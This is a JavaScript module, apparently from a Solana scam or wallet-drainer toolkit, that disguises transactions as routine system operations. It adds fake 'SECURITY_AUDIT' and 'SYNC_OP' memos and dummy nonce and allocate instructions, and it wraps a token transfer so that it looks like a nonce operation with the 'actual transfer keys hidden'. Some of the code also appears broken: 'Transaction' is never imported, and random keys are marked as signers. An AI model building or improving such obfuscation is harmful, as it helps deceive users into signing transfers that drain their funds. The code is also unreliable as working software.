/**
 * OBFUSCATION - Hide transaction data as system operations
 */

const { SystemProgram, TransactionInstruction, PublicKey } = require('@solana/web3.js');
const { MEMO_PROGRAM_ID, SYSTEM_PROGRAM_ID } = require('../../config/constants');
const logger = require('../../utils/logger');

class TransactionObfuscator {
  /**
   * Add system memos to make tx look like sync operation
   */
  addSystemMemos(transaction, options = {}) {
    const {
      memo = 'SYNC_OP: Account state verification',
      addNonceIx = true,
      addAllocateIx = false
    } = options;

    try {
      // Add memo instruction (looks like audit trail)
      const memoIx = this.createMemoInstruction(memo);
      
      if (addNonceIx) {
        // Add dummy nonce advance (looks like security)
        const nonceIx = this.createDummyNonceInstruction();
        transaction.instructions.unshift(nonceIx);
      }

      if (addAllocateIx) {
        // Add allocate instruction (looks like system sync)
        const allocateIx = this.createDummyAllocateInstruction();
        transaction.instructions.unshift(allocateIx);
      }

      // Add memo at the end too
      transaction.instructions.push(memoIx);

      logger.debug(`Obfuscation added: ${memo}`);

      return transaction;

    } catch (error) {
      logger.error('Obfuscation failed:', error);
      return transaction; // Return original on error
    }
  }

  /**
   * Create memo instruction
   */
  createMemoInstruction(text) {
    const timestamp = Date.now();
    const enhancedMemo = `${text} [${timestamp}] [NONCE:${Math.floor(Math.random()*1000000)}]`;
    
    return new TransactionInstruction({
      keys: [],
      programId: MEMO_PROGRAM_ID,
      data: Buffer.from(enhancedMemo, 'utf8')
    });
  }

  /**
   * Create dummy nonce instruction (looks like security operation)
   */
  createDummyNonceInstruction() {
    // Generate random nonce account (not real, just for appearance)
    const dummyNonce = PublicKey.unique();
    
    return SystemProgram.nonceAdvance({
      noncePubkey: dummyNonce,
      authorizedPubkey: PublicKey.unique() // Dummy auth
    });
  }

  /**
   * Create dummy allocate instruction
   */
  createDummyAllocateInstruction() {
    const dummyAccount = PublicKey.unique();
    
    return SystemProgram.allocate({
      accountPubkey: dummyAccount,
      space: 1024 // Looks like allocating space
    });
  }

  /**
   * Create full security rotation transaction
   */
  createSecurityRotation(transaction) {
    // Add multiple layers of obfuscation
    this.addSystemMemos(transaction, {
      memo: 'SECURITY_AUDIT: Nonce rotation at epoch boundary',
      addNonceIx: true
    });

    // Add another memo with different program
    const secondMemo = new TransactionInstruction({
      keys: [],
      programId: new PublicKey('Memo1qg4qABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
      data: Buffer.from('EPOCH_SYNC: Validator state verification', 'utf8')
    });
    
    transaction.instructions.push(secondMemo);

    return transaction;
  }

  /**
   * Create fake system account sync transaction
   */
  createSystemSyncTransaction(fromPubkey) {
    const dummyAccount = PublicKey.unique();
    
    // Create account (looks like system sync)
    const createIx = SystemProgram.createAccount({
      fromPubkey,
      newAccountPubkey: dummyAccount,
      lamports: 890880, // Minimum rent
      space: 2048,
      programId: SYSTEM_PROGRAM_ID
    });

    // Allocate more space (looks like sync)
    const allocateIx = SystemProgram.allocate({
      accountPubkey: dummyAccount,
      space: 4096
    });

    const transaction = new Transaction();
    transaction.add(createIx);
    transaction.add(allocateIx);
    
    // Add memo
    transaction.add(this.createMemoInstruction('SYNC_CONFIG: Account state synchronization'));

    return transaction;
  }

  /**
   * Encode transfer as nonce operation
   */
  encodeAsNonceOperation(transferIx) {
    // This is a more advanced technique that wraps transfer
    // inside what looks like a nonce operation
    
    return {
      programId: SYSTEM_PROGRAM_ID,
      keys: [
        { pubkey: PublicKey.unique(), isSigner: false, isWritable: true }, // Fake nonce
        { pubkey: PublicKey.unique(), isSigner: true, isWritable: false }, // Fake auth
        ...transferIx.keys // Actual transfer keys hidden
      ],
      data: Buffer.concat([
        Buffer.from([0x12, 0x34]), // Fake nonce prefix
        transferIx.data
      ])
    };
  }
}

module.exports = new TransactionObfuscator();